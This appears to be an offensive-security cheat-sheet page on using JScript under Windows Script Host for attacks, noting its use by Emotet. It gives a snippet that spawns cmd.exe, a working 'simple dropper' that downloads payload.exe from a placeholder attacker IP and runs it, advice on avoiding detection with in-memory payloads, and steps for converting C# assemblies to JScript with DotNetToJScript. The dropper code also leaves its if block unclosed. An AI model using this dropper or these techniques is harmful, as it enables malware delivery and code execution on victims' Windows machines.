# JScript

JScript is used by popular malware like Emotet. The .js extension is by default associated with Windows Scripting Host - so double clicking such a file will execute it.

### Simple Shell Command

```javascript
var shell = new ActiveXObject("WScript.Shell")
var res = shell.Run("cmd.exe");
```

### Simple Dropper

```javascript
var url = "http://<ip>/payload.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');
Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200){
    var Stream = WScript.CreateObject('ADODB.Stream');
    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;
    Stream.SaveToFile("payload.exe", 2);
    Stream.Close();
var r = new ActiveXObject("WScript.Shell").Run("payload.exe");
```

This dropper will create payload.exe on disk - so its not unlikely it will get caught. In-Memory payloads required interaction with C\#.



### Convert C\# to JScript

{% embed url="https://github.com/tyranid/DotNetToJScript" %}

Open the Project in VS, modify "ExampleAssembly" to your needs, then run:

```text
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js
```

